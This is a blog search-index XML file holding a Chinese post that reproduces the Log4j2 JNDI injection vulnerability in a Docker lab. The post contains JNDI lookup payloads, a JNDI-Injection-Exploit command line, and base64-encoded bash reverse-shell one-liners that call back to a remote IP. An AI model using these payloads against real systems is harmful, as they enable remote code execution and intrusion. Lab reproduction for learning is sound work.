<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/04/05/log4j2-lou-dong-fu-xian-1/"/>
      <url>/2022/04/05/log4j2-lou-dong-fu-xian-1/</url>
      
        <content type="html"><![CDATA[<h1 id="log4j2漏洞复现"><a href="#log4j2漏洞复现" class="headerlink" title="log4j2漏洞复现"></a>log4j2漏洞复现</h1><p> 最近的特大漏洞log4j2的出现，也是掀起了安全圈的一个风暴呀，自己也尝试着来复现一下吧，毕竟慢慢成长嘛。</p><p>漏洞描述Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞影响版本Apache Log4j 2.x &lt; 2.15.0-rc2</p><p>下面直接开始复现</p><p>现在虚拟机上面拉个Java环境，这样方便嘛</p><p>直接执行代码docker pull vulfocus/log4j2-rce-2021-12-09:latest</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405200600.png"></p><p>然后docker images 观看是那个镜像文件，把它跑起来</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405200606.png"></p><p>直接docker run -d -P vulfocus/log4j2-rce-2021-12-09  然后看这个跑起来的虚拟机的那个端口号映射到了本虚拟机的端口号docker ps</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405200723.png"></p><p>然后就直接访问这个网页是否搭建成功 直接访问192.168.227.128：49153   192.168.227.128是我kali虚拟机</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405200812.png"></p><p>然后就要先检测这个网页是否纯在log4j2这个漏洞，直接上bp。这里要主要箭头的地方，直接构造的payload要使用自己ceye上的payload=${jndi:ldap://zzz.yqy3cn.ceye.io} 前面的二级域名随便写什么，不写也可以。</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201043.png"></p><p>然后在ceye.io上出现了这个以后，就代表纯在这个log4j2漏洞。</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201201.png"></p><p>现在就到了最刺激的一步了，直接来弹shell吧。。</p><p>首先我们要启动一个idap服务，那就去github（JNDI-Injection-Exploit）上面下载吧。下载完成后在本地执行命令</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ}|{base64,-d}|{bash,-i}”-A “xxxxx(执行这个命令的本机ip)”</p><p>当然我这里是在自己的服务器上执行的，都可以看感觉吧 哈哈哈</p><p>先把这个文件提到我的服务器上面去</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201211.png"></p><p>然后直接执行命令哇，但是这里要注意写进去的shell命令要编码喔，否则不行。</p><p>bash -i &gt;&amp; /dev/tcp/120.25.208.59/6363 0&gt;&amp;1 直接反弹到自己的服务区上面去。在<a href="https://www.jackson-t.ca/runtime-exec-payloads.html%E7%BC%96%E7%A0%81%E5%90%8E%E4%B8%BA">https://www.jackson-t.ca/runtime-exec-payloads.html编码后为</a></p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjUuMjA4LjU5LzYzNjMgMD4mMQ==}|{base64,-d}|{bash,-i}</p><p>然后在服务器上面执行那个命令</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201219.png"></p><p>然后将这个放到bp上面执行，在自己的服务起上面监听6363端口</p><p>payload=${jndi:ldap://baidu.ehlf5h.ceye.io}</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201225.png"></p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201233.png"></p><p>然后就直接拿到shell,完成复现。</p><p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201249.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
